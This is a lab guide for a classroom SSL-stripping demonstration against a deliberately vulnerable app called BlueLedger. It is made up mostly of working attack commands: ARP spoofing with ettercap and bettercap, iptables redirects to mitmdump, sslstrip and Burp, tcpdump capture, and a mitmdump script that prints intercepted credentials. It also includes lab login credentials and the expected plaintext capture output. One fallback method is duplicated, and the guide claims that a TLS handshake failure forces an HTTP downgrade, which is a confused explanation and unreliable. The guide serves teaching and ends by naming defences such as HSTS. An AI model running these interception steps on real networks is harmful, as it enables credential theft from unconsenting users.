# SSL Stripping Lab Guide - WORKING VERSION

## 🏆 Recommended Methods (In Order of Reliability)

1. **Method 1: MITMdump** - Most reliable, shows all decrypted traffic
2. **Method 2: MITMproxy Web UI** - User-friendly with web interface  
3. **Method 3: Ettercap + SSLstrip** - Traditional approach, proven to work
4. **Method 4: Burp Suite** - Always works, great for detailed analysis
5. **Method 5: TCPDump + Manual** - Fallback when proxies fail
6. **Method 6: Bettercap** - Simple but often unreliable

## ⚠️ Critical Setup Requirements

**Network Setup:**
- Attacker and victim MUST be on same physical network/VLAN
- Use separate victim machine/VM (not same machine as attacker)  
- Disable VPN/proxy on both machines during testing
- Use wired connection if possible (more reliable than WiFi)

**VM/Container Setup:**
- **MongoDB 7.0 requires AVX CPU support**
- **Proxmox VMs:** Set CPU type to "host" in VM Hardware settings
- **QEMU/KVM:** Use `-cpu host` or enable AVX flags
- **Alternative:** Use MongoDB 4.4 (no AVX required)

**Before Starting:**
1. Verify victim can normally access the HTTPS service
2. Ensure attacker machine can route traffic properly
3. Have victim credentials ready: `Employee@sinamoa.com / Employee123!@#`

## Step 1: Network Discovery & Setup

### Find Your Network Interface
```bash
ip addr show | grep -E "inet.*192.168|inet.*10\.|inet.*172\."
```
Note your interface name (eth0, wlan0, etc.)

### Discover Network Devices
```bash
# Replace [INTERFACE] with your actual interface
sudo nmap -sn 192.168.1.0/24    # Adjust subnet as needed
# OR
sudo bettercap -iface [INTERFACE] -eval "net.recon on; sleep 10; net.show; exit"
```

### Enable IP Forwarding (REQUIRED)
```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
echo 0 | sudo tee /proc/sys/net/ipv4/conf/all/send_redirects
```

## Step 2: Start BlueLedger Target

```bash
cd /path/to/BlueLedger
podman-compose up    # or docker-compose up
```

Verify it's accessible on HTTPS:
```bash
curl -k https://[YOUR_IP]:5001/health
```

## Step 3: SSL Stripping Attack - Method 1 (MITMdump - Most Reliable)

**Terminal 1 - Start MITMdump (No Scripts Required):**
```bash
# Show all decrypted traffic - perfect for classroom demonstration
sudo mitmdump --mode transparent --ssl-insecure --showhost --set flow_detail=3

# Alternative: Filter to show only credentials
# sudo mitmdump --mode transparent --ssl-insecure --showhost | grep -E "(POST|email|password|login)"
```

**Terminal 2 - ARP Spoof with Ettercap:**
```bash
# Replace [INTERFACE], [VICTIM_IP], and [GATEWAY_IP] with actual values
sudo ettercap -T -M arp:remote /[VICTIM_IP]// /[GATEWAY_IP]//
```

**Terminal 3 - Traffic Redirection:**
```bash
# Redirect HTTPS traffic to mitmdump (port 8080)
sudo iptables -t nat -A PREROUTING -i [INTERFACE] -p tcp --dport 443 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -i [INTERFACE] -p tcp --dport 5001 -j REDIRECT --to-port 8080
```

**Terminal 4 - Run Victim Simulator:**
```bash
python3 victim_simulator.py
# Enter the attacker's IP address when prompted
```

**What You'll See:**
- Victim tries HTTPS → Gets 200 response (appears to work)
- MITMdump shows "TLS handshake failed" → SSL stripped successfully  
- Plaintext credentials appear: `{"email":"Employee@sinamoa.com","password":"Employee123!@#"}`

## Step 4: SSL Stripping Attack - Method 2 (MITMproxy Web UI)

For a visual interface that students can see in a browser:

**Terminal 1 - Start MITMproxy Web Interface:**
```bash
# Web interface - great for classroom demonstrations
sudo mitmweb --mode transparent --ssl-insecure --web-host 0.0.0.0
```

**Terminal 2-4:** Same as Method 1 (ettercap, iptables, victim simulator)

**View Results:**
- Open browser to `http://localhost:8081`
- See all intercepted traffic in real-time
- Click on requests to see headers and body data
- Credentials will appear in POST request bodies

## Step 5: Manual Testing (If Automated Doesn't Work)

**From Victim Machine:**
```bash
# Test normal HTTPS (should work)
curl -k -X POST https://[ATTACKER_IP]:5001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"Employee@sinamoa.com","password":"Employee123!@#"}'

# Test if SSL is being stripped (should show in bettercap)  
curl -X POST http://[ATTACKER_IP]:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"Employee@sinamoa.com","password":"Employee123!@#"}'
```

## Expected Results

**In Bettercap Output:**
```
[POST] http://[IP]:5000/api/auth/login
{"email":"Employee@sinamoa.com","password":"Employee123!@#"}
```

**In Victim Terminal:**
```
[14:32:15] Sending login request to https://[IP]:5001/api/auth/login
[14:32:15] Response: 200
```

## Troubleshooting

### Problem: Victim gets HTTPS timeouts
**Solution:** Check if ARP spoofing is working:
```bash
# On victim machine, check ARP table
arp -a | grep [ATTACKER_MAC]
```

### Problem: 200 responses but no credentials captured
**Solutions:**
1. Check if IP forwarding is enabled
2. Try different bettercap proxy port (8080, 8443)
3. Verify bettercap is intercepting with `netstat -tlnp | grep 8080`
4. Use `tcpdump` method shown in Method 2

### Problem: MITMproxy "TLS handshake failed" with self-signed certificates
**This is EXPECTED behavior - it means SSL stripping is working!**
```bash
# The TLS failure forces HTTP downgrade, which is what we want
# Use --ssl-insecure flag and look for these signs:
# 1. Victim gets 200 responses (connection works)
# 2. Mitmproxy shows failed TLS, then successful HTTP
# 3. Credentials appear in plaintext in mitmproxy logs

# Verify it's working:
curl -v -k https://[TARGET_IP]:5001/api/auth/login
# Should fail with TLS error, then victim_simulator gets 200 via HTTP
```

### Problem: Connection refused errors
**Solutions:**
1. Verify BlueLedger is running on both HTTP and HTTPS
2. Check firewall: `sudo iptables -L | grep -E "(5000|5001)"`
3. Test direct connection from attacker machine first

### Problem: ARP spoofing not working  
**Solutions:**
1. Try without `fullduplex`: remove `set arp.spoof.fullduplex true;`
2. Use gateway spoofing: `set arp.spoof.targets [VICTIM_IP],[GATEWAY_IP];`
3. Check if network has ARP spoofing protection

### Problem: MongoDB "illegal instruction" or AVX errors
**This happens on VMs without AVX CPU support**

**Proxmox Fix:**
1. Shutdown VM
2. Go to VM → Hardware → Processors
3. Change "Type" from "kvm64" to "host"
4. Start VM and try again

**Alternative Solutions:**
```bash
# Option 1: Use MongoDB 4.4 instead
# Edit docker-compose.yml: change mongo:7.0 to mongo:4.4

# Option 2: QEMU command line flag
-cpu host,+avx,+avx2

# Option 3: Check if your host CPU supports AVX
grep -o avx /proc/cpuinfo
```

## Method 3: Ettercap + SSLstrip (Traditional Method)

### Install Required Tools
```bash
sudo apt install ettercap-text-only sslstrip dsniff
```

### Setup
```bash
# Terminal 1 - Start ettercap for ARP spoofing
sudo ettercap -T -M arp:remote /[VICTIM_IP]// /[GATEWAY_IP]//

# Terminal 2 - Start sslstrip  
sudo sslstrip -l 8080 -w /tmp/sslstrip.log

# Terminal 3 - Redirect HTTPS traffic to sslstrip
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 5001 -j REDIRECT --to-port 8080

# Terminal 4 - Monitor captured credentials
tail -f /tmp/sslstrip.log
```

### Cleanup
```bash
sudo iptables -t nat -F
sudo pkill ettercap
sudo pkill sslstrip
```

## Method 4: Burp Suite (Always Works)

### Using Burp Suite Community
1. Download and install Burp Suite Community
2. Configure Burp to listen on all interfaces (0.0.0.0:8080)
3. Enable "Support invisible proxying"

```bash
# ARP spoof
sudo ettercap -T -M arp:remote /[VICTIM_IP]// /[GATEWAY_IP]//

# Redirect traffic to Burp
sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -p tcp --dport 5001 -j REDIRECT --to-port 8080
```

## Method 5: TCPDump + Manual Analysis (Fallback)

If all proxies fail, capture and analyze manually:

```bash
# Start ARP spoofing
sudo ettercap -T -M arp:remote /[VICTIM_IP]// /[GATEWAY_IP]//

# Capture all HTTP traffic
sudo tcpdump -i [INTERFACE] -A -s 0 'host [VICTIM_IP] and tcp and port 5000' -w /tmp/capture.pcap

# Analyze in Wireshark or with strings
strings /tmp/capture.pcap | grep -E "(email|password|Employee)"
```

## Method 6: Bettercap (Simple but Unreliable)

**Basic Bettercap Command:**
```bash
# Replace [INTERFACE] and [VICTIM_IP] with actual values
sudo bettercap -iface [INTERFACE] -eval "
set arp.spoof.targets [VICTIM_IP];
arp.spoof on;
set http.proxy.sslstrip true;
http.proxy on;
net.sniff on;
"
```

**Monitor for Credentials:**
```bash
# Watch bettercap output for POST requests with credentials
# Look for: POST data containing {"email":"Employee@sinamoa.com","password":"Employee123!@#"}
```

## Method 7: Simple HTTP Proxy (Debugging Tool)

```bash
# Install mitmproxy for mitmdump
pip install mitmproxy

# Create simple logging proxy
mitmdump -s - <<EOF
def response(flow):
    if "application/json" in flow.request.headers.get("content-type", ""):
        if "email" in flow.request.text and "password" in flow.request.text:
            print(f"[!] CREDENTIALS: {flow.request.text}")
EOF

# Run with traffic redirection (use ettercap for ARP spoofing)
```

## Method 8: TCPDump + Manual Analysis (Fallback)

If all proxies fail, capture and analyze manually:

```bash
# Start ARP spoofing
sudo ettercap -T -M arp:remote /[VICTIM_IP]// /[GATEWAY_IP]//

# Capture all HTTP traffic
sudo tcpdump -i [INTERFACE] -A -s 0 'host [VICTIM_IP] and tcp and port 5000' -w /tmp/capture.pcap

# Analyze in Wireshark or with strings
strings /tmp/capture.pcap | grep -E "(email|password|Employee)"
```

## Clean Up

```bash
# Stop bettercap (Ctrl+C)
# Reset IP forwarding
echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward

# Clear ARP tables on victim
sudo ip neigh flush all
```

## Notes for Production Use

- This demonstrates why HSTS (HTTP Strict Transport Security) is critical
- Certificate pinning would prevent this attack
- Always use HTTPS-only applications
- Monitor for ARP spoofing on production networks